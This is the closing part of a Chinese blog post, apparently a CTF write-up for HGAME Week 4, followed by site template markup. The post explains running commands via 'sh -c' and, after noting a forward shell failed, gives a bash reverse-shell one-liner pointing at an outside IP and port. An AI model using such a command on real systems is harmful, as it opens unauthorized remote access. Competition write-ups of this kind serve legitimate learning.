+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">sh -<span class="hljs-keyword">c</span> <span class="hljs-string">&quot;ls /&quot;</span><br></code></pre></td></tr></table></figure>
+<p>您可以使用以下命令在Shell解释器中执行<code>ls</code>命令：</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">shell</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">sh </span>-c <span class="hljs-string">&quot;ls&quot;</span><br></code></pre></td></tr></table></figure>
+<p>上述命令将通过Shell解释器执行<code>ls</code>命令，并将其输出显示在终端上。</p>
+<p>在这里，<code>-c</code>选项告诉<code>sh</code>程序要执行一个命令字符串，后面的引号内是要执行的命令。因此，命令字符串为<code>&quot;ls&quot;</code>，表示要执行<code>ls</code>命令。</p>
+<p>这里nc了一下不行</p>
+<p>正向shell无法建立的话</p>
+<p>那就只好使用反向shell了</p>
+<p>sh -c “sh -i &gt;&amp; /dev/tcp/106.40.23.125/2333 0&gt;&amp;1”</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>HGAME_WEEK4</div>
+      <div>https://s0k1y.github.io/2024/03/13/HGAME-WEEK4/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>s0k1y</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年3月13日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/09/17/%E5%9B%BE%E7%89%87%E8%B7%AF%E5%BE%84%E9%97%AE%E9%A2%98/" title="图片路径问题">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">图片路径问题</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/03/13/HGAME-WEEK3/" title="HGAME_WEEK3">
+                        <span class="hidden-mobile">HGAME_WEEK3</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="/js/flower.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+<script type="text/javascript" src="/js/click_show_text.js"></script>
+<script type="text/javascript" src="\js\snow.js"></script>
